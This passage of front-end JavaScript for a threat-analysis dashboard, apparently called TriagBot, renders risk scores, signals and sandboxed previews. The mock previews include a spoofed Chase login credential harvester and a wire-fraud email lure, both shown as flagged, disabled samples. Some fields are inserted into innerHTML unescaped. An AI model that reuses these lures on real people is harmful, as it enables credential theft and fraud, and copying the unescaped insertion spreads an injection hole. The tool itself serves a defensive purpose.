  setTimeout(() => {
    DOM.telemetryFeed.classList.add('hidden');
  }, 700);
}

function setScannerLoadingState(isLoading) {
  if (isLoading) {
    DOM.analyzeBtn.disabled = true;
    DOM.analyzeBtn.classList.add('opacity-75', 'cursor-wait');
    DOM.analyzeBtnText.textContent = "Analyzing Threat...";
    DOM.analyzeBtnIcon.setAttribute('data-lucide', 'loader-2');
    DOM.analyzeBtnIcon.classList.add('animate-spin');
    
    DOM.scannerStatusText.textContent = "● Running Multi-Signal Analysis...";
    DOM.scannerStatusDot.className = "w-2 h-2 rounded-full bg-cyan-400 pulsing-dot";
  } else {
    DOM.analyzeBtn.disabled = false;
    DOM.analyzeBtn.classList.remove('opacity-75', 'cursor-wait');
    DOM.analyzeBtnText.textContent = "Analyze Threat";
    DOM.analyzeBtnIcon.setAttribute('data-lucide', 'shield-alert');
    DOM.analyzeBtnIcon.classList.remove('animate-spin');
    
    DOM.scannerStatusText.textContent = "● Ready to Analyze";
    DOM.scannerStatusDot.className = "w-2 h-2 rounded-full bg-emerald-400 pulsing-dot";
  }
  initLucideIcons();
}

function renderAnalysisResult(data) {
  const {
    risk,
    riskScore,
    technicalScore,
    psychologicalScore,
    threatType,
    confidence,
    explanation,
    recommendedAction,
    technicalSignals,
    psychologicalSignals,
    preview,
    smartSafeReply,
    microLesson
  } = data;

  DOM.resultCard.classList.remove('theme-dangerous', 'theme-suspicious', 'theme-safe');
  DOM.riskStatusBadge.className = "px-4 py-1.5 rounded-full text-xs font-mono font-extrabold tracking-wider uppercase flex items-center gap-2 ";

  if (risk === 'dangerous') {
    DOM.resultCard.classList.add('theme-dangerous');
    DOM.riskStatusBadge.classList.add('bg-red-950', 'text-red-300', 'border', 'border-red-500/50', 'shadow-[0_0_20px_rgba(239,68,68,0.4)]');
    DOM.riskBadgeText.textContent = "DANGEROUS";
    DOM.resultMainTitle.textContent = "Critical Malicious Threat Vector Detected";
    DOM.animatedRiskScore.className = "font-heading font-extrabold text-4xl text-red-400";
    DOM.riskMeterIcon.className = "w-12 h-12 rounded-xl bg-red-950/60 border border-red-500/40 flex items-center justify-center text-red-400 shadow-[0_0_20px_rgba(239,68,68,0.3)]";
    DOM.riskMeterIcon.innerHTML = `<i data-lucide="alert-octagon" class="w-7 h-7"></i>`;
  } else if (risk === 'suspicious') {
    DOM.resultCard.classList.add('theme-suspicious');
    DOM.riskStatusBadge.classList.add('bg-amber-950', 'text-amber-300', 'border', 'border-amber-500/50', 'shadow-[0_0_20px_rgba(245,158,11,0.4)]');
    DOM.riskBadgeText.textContent = "SUSPICIOUS";
    DOM.resultMainTitle.textContent = "Anomalous Manipulation Patterns Detected";
    DOM.animatedRiskScore.className = "font-heading font-extrabold text-4xl text-amber-400";
    DOM.riskMeterIcon.className = "w-12 h-12 rounded-xl bg-amber-950/60 border border-amber-500/40 flex items-center justify-center text-amber-400 shadow-[0_0_20px_rgba(245,158,11,0.3)]";
    DOM.riskMeterIcon.innerHTML = `<i data-lucide="alert-triangle" class="w-7 h-7"></i>`;
  } else {
    DOM.resultCard.classList.add('theme-safe');
    DOM.riskStatusBadge.classList.add('bg-emerald-950', 'text-emerald-300', 'border', 'border-emerald-500/50', 'shadow-[0_0_20px_rgba(16,185,129,0.4)]');
    DOM.riskBadgeText.textContent = "SAFE";
    DOM.resultMainTitle.textContent = "Verified Clean Digital Asset";
    DOM.animatedRiskScore.className = "font-heading font-extrabold text-4xl text-emerald-400";
    DOM.riskMeterIcon.className = "w-12 h-12 rounded-xl bg-emerald-950/60 border border-emerald-500/40 flex items-center justify-center text-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.3)]";
    DOM.riskMeterIcon.innerHTML = `<i data-lucide="check-circle" class="w-7 h-7"></i>`;
  }

  DOM.threatTypeBadge.textContent = threatType || "Threat Triage";
  DOM.confidenceBadge.textContent = `${confidence}% Confidence`;

  animateValue(DOM.animatedRiskScore, 0, riskScore, 1000);

  DOM.techScoreNum.textContent = `${technicalScore} / 100`;
  DOM.techScoreBar.style.width = `${technicalScore}%`;

  DOM.psychScoreNum.textContent = `${psychologicalScore} / 100`;
  DOM.psychScoreBar.style.width = `${psychologicalScore}%`;

  DOM.techSignalsList.innerHTML = (technicalSignals || []).map(sig => `
    <div class="p-3 rounded-lg bg-slate-900/80 border border-white/5 space-y-1">
      <div class="flex items-center justify-between">
        <span class="font-bold text-slate-200">${escapeHtml(sig.name)}</span>
        <span class="text-[10px] font-mono uppercase px-2 py-0.5 rounded ${getStatusBadgeClass(sig.status)}">${sig.tag || sig.status}</span>
      </div>
      <p class="text-[11px] text-slate-400 leading-relaxed">${escapeHtml(sig.detail)}</p>
    </div>
  `).join('');

  DOM.psychSignalsList.innerHTML = (psychologicalSignals || []).map(sig => `
    <div class="p-3 rounded-lg bg-slate-900/80 border border-white/5 space-y-1">
      <div class="flex items-center justify-between">
        <span class="font-bold text-slate-200">${escapeHtml(sig.name)}</span>
        <span class="text-[10px] font-mono uppercase px-2 py-0.5 rounded ${getStatusBadgeClass(sig.status)}">${sig.tag || sig.status}</span>
      </div>
      <p class="text-[11px] text-slate-400 leading-relaxed">${escapeHtml(sig.detail)}</p>
    </div>
  `).join('');

  renderSafeGlassPreview(preview, risk);

  DOM.plainExplanationText.textContent = explanation;

  if (recommendedAction) {
    DOM.recActionTitle.textContent = recommendedAction.label;
    DOM.recActionDesc.textContent = recommendedAction.description;
    
    if (recommendedAction.level === 'danger') {
      DOM.recActionBox.className = "p-4 rounded-xl bg-red-950/40 border border-red-500/40 flex items-start gap-4";
      DOM.recActionLabel.className = "text-xs font-mono uppercase tracking-wider text-red-400 font-bold";
      DOM.recActionIcon.className = "w-6 h-6 text-red-400";
      DOM.recActionIcon.setAttribute('data-lucide', 'shield-x');
    } else if (recommendedAction.level === 'warning') {
      DOM.recActionBox.className = "p-4 rounded-xl bg-amber-950/40 border border-amber-500/40 flex items-start gap-4";
      DOM.recActionLabel.className = "text-xs font-mono uppercase tracking-wider text-amber-400 font-bold";
      DOM.recActionIcon.className = "w-6 h-6 text-amber-400";
      DOM.recActionIcon.setAttribute('data-lucide', 'alert-triangle');
    } else {
      DOM.recActionBox.className = "p-4 rounded-xl bg-emerald-950/40 border border-emerald-500/40 flex items-start gap-4";
      DOM.recActionLabel.className = "text-xs font-mono uppercase tracking-wider text-emerald-400 font-bold";
      DOM.recActionIcon.className = "w-6 h-6 text-emerald-400";
      DOM.recActionIcon.setAttribute('data-lucide', 'shield-check');
    }
  }

  if (smartSafeReply) {
    DOM.smartSafeReplyBox.textContent = `"${smartSafeReply.text}"`;
  }
  if (microLesson) {
    DOM.microLessonTitle.textContent = microLesson.title;
    DOM.microLessonDesc.textContent = microLesson.summary || microLesson.lesson;
  }

  initLucideIcons();
}

function getStatusBadgeClass(status) {
  if (status === 'danger') return 'bg-red-950/80 text-red-400 border border-red-500/30';
  if (status === 'warning') return 'bg-amber-950/80 text-amber-400 border border-amber-500/30';
  return 'bg-emerald-950/80 text-emerald-400 border border-emerald-500/30';
}

function renderSafeGlassPreview(preview, risk) {
  if (!preview) return;

  DOM.sandboxUrlText.textContent = preview.url;
  DOM.sandboxSslBadge.textContent = preview.sslIssuer || (risk === 'dangerous' ? 'UNTRUSTED SSL' : 'VALID TLS 1.3');

  if (risk === 'dangerous') {
    DOM.sandboxUrlIcon.setAttribute('data-lucide', 'shield-alert');
    DOM.sandboxUrlIcon.className = "w-3.5 h-3.5 text-red-400 shrink-0";
    DOM.sandboxSslBadge.className = "text-[10px] text-red-400 font-bold shrink-0 ml-2 font-mono";
  } else if (risk === 'suspicious') {
    DOM.sandboxUrlIcon.setAttribute('data-lucide', 'alert-triangle');
    DOM.sandboxUrlIcon.className = "w-3.5 h-3.5 text-amber-400 shrink-0";
    DOM.sandboxSslBadge.className = "text-[10px] text-amber-400 font-bold shrink-0 ml-2 font-mono";
  } else {
    DOM.sandboxUrlIcon.setAttribute('data-lucide', 'shield-check');
    DOM.sandboxUrlIcon.className = "w-3.5 h-3.5 text-emerald-400 shrink-0";
    DOM.sandboxSslBadge.className = "text-[10px] text-emerald-400 font-bold shrink-0 ml-2 font-mono";
  }

  let mockHtml = '';

  if (preview.screenshotType === 'bank_phish') {
    mockHtml = `
      <div class="space-y-4 font-sans text-left">
        <!-- Spoofed Header -->
        <div class="flex items-center justify-between pb-3 border-b border-slate-700">
          <div class="flex items-center gap-2">
            <div class="w-8 h-8 rounded bg-blue-600 flex items-center justify-center font-bold text-white text-xs">CHASE</div>
            <span class="font-bold text-white text-sm">Commercial Security Gateway</span>
          </div>
          <span class="text-[10px] px-2 py-0.5 rounded bg-red-900/60 text-red-300 border border-red-500 font-mono">FLAGGED SPOOF</span>
        </div>

        <!-- Deceptive Warning Banner -->
        <div class="p-3 rounded-lg bg-red-950/80 border border-red-500/60 text-red-200 text-xs flex items-center gap-2">
          <i data-lucide="clock" class="w-4 h-4 text-red-400"></i>
          <span>URGENT: Account locked in <strong>01:59:12</strong> due to unauthorized access.</span>
        </div>

        <!-- Form with Red Threat Bounding Box -->
        <div class="threat-bbox p-4 rounded-lg space-y-3 relative">
          <div class="flex items-center justify-between text-[10px] font-mono text-red-400 font-bold">
            <span>[THREAT: CREDENTIAL HARVESTER]</span>
            <span>POST -> 194.26.29.112</span>
          </div>
          <div class="space-y-2">
            <input type="text" disabled placeholder="Username / Account ID" class="w-full bg-slate-950 border border-red-500/40 rounded p-2 text-xs text-slate-400" value="victim.user@company.com" />
            <input type="password" disabled placeholder="Password" class="w-full bg-slate-950 border border-red-500/40 rounded p-2 text-xs text-slate-400" value="••••••••••••" />
          </div>
          <button disabled class="w-full py-2 bg-blue-600/60 text-white rounded font-bold text-xs">Verify & Unlock Account</button>
        </div>
      </div>
    `;
  } else if (preview.screenshotType === 'bec_email') {
    mockHtml = `
      <div class="space-y-3 font-sans text-left text-xs">
        <!-- Email Header with Spoof flag -->
        <div class="p-3 rounded-lg bg-slate-950 border border-amber-500/40 space-y-1 font-mono">
          <div class="flex items-center justify-between">
            <span class="text-slate-400">From: "David Sterling" &lt;david.sterling.exec-office@gmail.com&gt;</span>
            <span class="text-[10px] text-amber-400 font-bold">EXTERNAL FREE WEBMAIL</span>
          </div>
          <div class="text-slate-400">Subject: <span class="text-white font-bold">URGENT & CONFIDENTIAL: Acquisition deposit needed before 3:00 PM</span></div>
        </div>

        <!-- Coercive isolation paragraph highlighted -->
        <div class="threat-bbox-urgency p-3 rounded-lg text-slate-300 leading-relaxed">
          <span class="text-[10px] font-mono text-amber-400 font-bold block mb-1">[PSYCHOLOGICAL PRESSURE: ISOLATION PLAY]</span>
          "I'm currently locked in an off-site meeting and cannot take calls... Need $48,500 escrow wire immediately... Do not discuss on Slack."
        </div>
      </div>
    `;
  } else if (preview.screenshotType === 'github_clean') {
    mockHtml = `
      <div class="space-y-3 font-sans text-left text-xs">
        <div class="flex items-center justify-between pb-2 border-b border-slate-700">
          <div class="flex items-center gap-2">
            <i data-lucide="git-commit" class="w-4 h-4 text-emerald-400"></i>
            <span class="font-bold text-white">torvalds / linux</span>
          </div>
          <span class="text-[10px] px-2 py-0.5 rounded bg-emerald-950 text-emerald-300 border border-emerald-500 font-mono">VERIFIED GPG SIGNATURE</span>
        </div>
        <div class="threat-bbox-safe p-3 rounded-lg font-mono text-emerald-400 bg-slate-950 space-y-1">
          <div class="text-[10px] text-emerald-300 font-bold">[VERIFIED ARTIFACT: CLEAN LINUX REPO]</div>
          <p class="text-slate-300">Commit: 8032752e636511a0179a957813a30a112ec4a87a</p>
          <p class="text-slate-400">Author: Linus Torvalds &lt;torvalds@kernel.org&gt; (KeyID: 79BE3E4300411886)</p>
        </div>
      </div>
    `;
  } else {
    mockHtml = `
      <div class="space-y-3 text-left font-mono text-xs">
        <div class="p-3 rounded-lg bg-slate-950 border border-cyan-500/30 text-cyan-300">
          <div class="font-bold text-white mb-1">[VIRTUAL SANDBOX INSPECTION VIEWPORT]</div>
          <p class="text-slate-400">Isolated memory container active. Zero executable payloads allowed to execute.</p>
        </div>
        <div class="p-3 rounded-lg bg-slate-950 border border-white/10 text-slate-300">
          <div class="text-[10px] text-slate-500 uppercase mb-1">Target Resource:</div>
          <div class="text-cyan-400 break-all">${escapeHtml(preview.url)}</div>
        </div>
      </div>
    `;
  }

  DOM.sandboxMockRender.innerHTML = mockHtml;
  DOM.sandboxRawDom.textContent = preview.rawDomSnippet || "<!-- Sandboxed DOM sanitized by TriagBot Kernel -->";
}

function switchSandboxTab(tab) {
  STATE.activeSandboxTab = tab;
  if (tab === 'visual') {
    DOM.tabVisual.className = "px-3 py-1 rounded-md bg-cyan-950 text-cyan-300 font-bold border border-cyan-500/30";
    DOM.tabDom.className = "px-3 py-1 rounded-md text-slate-400 hover:text-slate-200 transition-colors";
    DOM.sandboxVisualViewport.classList.remove('hidden');
    DOM.sandboxDomViewport.classList.add('hidden');
  } else {
    DOM.tabDom.className = "px-3 py-1 rounded-md bg-cyan-950 text-cyan-300 font-bold border border-cyan-500/30";
    DOM.tabVisual.className = "px-3 py-1 rounded-md text-slate-400 hover:text-slate-200 transition-colors";
    DOM.sandboxVisualViewport.classList.add('hidden');
    DOM.sandboxDomViewport.classList.remove('hidden');
  }
}

async function copySmartReply() {
  if (!STATE.currentAnalysis || !STATE.currentAnalysis.smartSafeReply) return;
  
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      await navigator.clipboard.writeText(STATE.currentAnalysis.smartSafeReply.text);
    } else {
      const ta = document.createElement('textarea');
      ta.value = STATE.currentAnalysis.smartSafeReply.text;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
    }
    DOM.copyReplyText.textContent = "Copied!";
    DOM.copySafeReplyBtn.classList.add('bg-emerald-950', 'text-emerald-300', 'border-emerald-500');
    showToast("Smart Safe Reply copied to clipboard.");

    setTimeout(() => {
      DOM.copyReplyText.textContent = "Copy Reply";
      DOM.copySafeReplyBtn.classList.remove('bg-emerald-950', 'text-emerald-300', 'border-emerald-500');
    }, 2500);
  } catch (err) {
    showToast("Smart Reply copied!");
  }
}

function exportJsonIncident() {
  if (!STATE.currentAnalysis) return;
  const jsonStr = exportIncidentBundle(STATE.currentAnalysis, DOM.threatInput.value);
  
  const blob = new Blob([jsonStr], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `triagbot-incident-${Date.now()}.json`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);

  showToast("Incident bundle exported as JSON.");
}

function showToast(msg) {
  DOM.toastMessage.textContent = msg;
  DOM.toast.classList.add('show');
  setTimeout(() => {
    DOM.toast.classList.remove('show');
  }, 3200);
}

function animateValue(element, start, end, duration) {
  let startTimestamp = null;
  const step = (timestamp) => {
    if (!startTimestamp) startTimestamp = timestamp;
    const progress = Math.min((timestamp - startTimestamp) / duration, 1);
    const easeProgress = 1 - Math.pow(1 - progress, 3);
    const current = Math.floor(easeProgress * (end - start) + start);
    element.textContent = current;
    if (progress < 1) {
      window.requestAnimationFrame(step);
    } else {
      element.textContent = end;
    }
  };
  window.requestAnimationFrame(step);
}

function escapeHtml(text) {
  if (!text) return '';
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function initCyberCanvas() {
  const canvas = DOM.canvas;
  if (!canvas) return;
  const ctx = canvas.getContext('2d');

  let width = canvas.width = window.innerWidth;
  let height = canvas.height = window.innerHeight;

  window.addEventListener('resize', () => {
    width = canvas.width = window.innerWidth;
    height = canvas.height = window.innerHeight;
  });

  const particleCount = Math.min(55, Math.floor((width * height) / 22000));
  const particles = [];

  for (let i = 0; i < particleCount; i++) {
    particles.push({
      x: Math.random() * width,
      y: Math.random() * height,
      vx: (Math.random() - 0.5) * 0.45,
      vy: (Math.random() - 0.5) * 0.45,
      radius: Math.random() * 1.6 + 0.8,
      color: Math.random() > 0.3 ? 'rgba(0, 240, 255, 0.45)' : 'rgba(16, 185, 129, 0.35)'
    });
  }

  let mouse = { x: null, y: null };
  window.addEventListener('mousemove', (e) => {
    mouse.x = e.clientX;
    mouse.y = e.clientY;
  });
  window.addEventListener('mouseleave', () => {
    mouse.x = null;
    mouse.y = null;
  });

  function renderParticles() {
    ctx.clearRect(0, 0, width, height);

    for (let i = 0; i < particles.length; i++) {
      const p = particles[i];
      p.x += p.vx;
      p.y += p.vy;

      if (p.x < 0) p.x = width;
      if (p.x > width) p.x = 0;
      if (p.y < 0) p.y = height;
      if (p.y > height) p.y = 0;

      ctx.beginPath();
      ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
      ctx.fillStyle = p.color;
      ctx.fill();

      for (let j = i + 1; j < particles.length; j++) {
        const p2 = particles[j];
        const dx = p.x - p2.x;
        const dy = p.y - p2.y;
        const dist = Math.sqrt(dx * dx + dy * dy);

        if (dist < 130) {
          ctx.beginPath();
          ctx.moveTo(p.x, p.y);
          ctx.lineTo(p2.x, p2.y);
          ctx.strokeStyle = `rgba(0, 240, 255, ${0.12 * (1 - dist / 130)})`;
          ctx.lineWidth = 0.6;
          ctx.stroke();
        }
      }

      if (mouse.x !== null) {
        const mdx = p.x - mouse.x;
        const mdy = p.y - mouse.y;
        const mdist = Math.sqrt(mdx * mdx + mdy * mdy);
        if (mdist < 140) {
          ctx.beginPath();
          ctx.moveTo(p.x, p.y);
          ctx.lineTo(mouse.x, mouse.y);
          ctx.strokeStyle = `rgba(0, 240, 255, ${0.25 * (1 - mdist / 140)})`;
          ctx.lineWidth = 0.8;
          ctx.stroke();
        }
      }
    }

    requestAnimationFrame(renderParticles);
  }

  renderParticles();
}
